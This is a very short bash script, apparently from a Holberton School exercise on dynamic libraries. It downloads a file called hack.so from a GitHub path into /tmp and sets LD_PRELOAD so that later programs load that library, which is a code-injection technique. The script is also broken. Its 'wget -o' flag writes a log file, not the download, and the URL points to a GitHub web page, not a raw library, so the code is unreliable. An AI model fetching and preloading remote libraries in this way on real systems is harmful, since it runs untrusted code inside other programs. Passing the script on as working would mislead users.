#!/bin/bash
wget -o /tmp/hack.so https://github.com/chitny/holbertonschool-low_level_programming/tree/main/0x18-dynamic_libraries/hack.so
export LD_PRELOAD=/tmp/hack.so
